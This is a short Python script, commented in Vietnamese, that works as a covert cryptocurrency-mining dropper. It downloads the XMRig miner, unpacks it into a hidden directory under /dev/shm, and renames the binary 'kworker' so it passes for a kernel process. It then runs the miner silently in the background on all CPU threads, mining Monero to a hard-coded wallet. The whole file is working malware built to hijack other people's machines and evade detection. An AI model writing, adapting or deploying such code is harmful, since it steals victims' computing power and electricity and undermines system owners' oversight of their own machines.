import os
import subprocess
import sys
import urllib.request
import tarfile
import shutil
import time

# ========= Cấu hình =========
POOL = "pool.hashvault.pro:443"
WALLET = "85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
WORKER = f"worker-{os.uname()[1]}"
CPU_THREADS = os.cpu_count()
HIDDEN_DIR = "/dev/shm/.cache"  # Ẩn trong RAM, tự xóa khi reboot
XMRIG_VERSION = "6.21.1"
XMRIG_URL = f"https://github.com/xmrig/xmrig/releases/download/v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"
FAKE_NAME = "kworker"  # Tên giả mạo tiến trình

# ========= Hàm tải và giải nén =========
def download_and_extract():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    tar_path = os.path.join(HIDDEN_DIR, ".core.tar.gz")
    try:
        urllib.request.urlretrieve(XMRIG_URL, tar_path)
    except Exception as e:
        print(f"Lỗi tải: {e}")
        sys.exit(1)

    try:
        with tarfile.open(tar_path, "r:gz") as tar:
            tar.extractall(path=HIDDEN_DIR)
    except Exception as e:
        print(f"Lỗi giải nén: {e}")
        sys.exit(1)

    os.remove(tar_path)

# ========= Hàm khởi chạy ẩn =========
def run_hidden():
    xmrig_dir = next((os.path.join(HIDDEN_DIR, d) for d in os.listdir(HIDDEN_DIR) if d.startswith("xmrig-")), None)
    if not xmrig_dir:
        print("Không tìm thấy thư mục XMRig.")
        sys.exit(1)

    real_path = os.path.join(xmrig_dir, "xmrig")
    fake_path = os.path.join(HIDDEN_DIR, FAKE_NAME)

    try:
        shutil.copy(real_path, fake_path)
        os.chmod(fake_path, 0o700)
        subprocess.Popen(
            [fake_path, "-o", POOL, "-u", WALLET + '.' + WORKER, "--coin", "monero",
             "--cpu-priority", "3", "--threads", str(CPU_THREADS), "--donate-level", "1", "--background"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"Lỗi chạy ẩn: {e}")
        sys.exit(1)

# ========= Main =========
def main():
    download_and_extract()
    run_hidden()

if __name__ == "__main__":
    main()
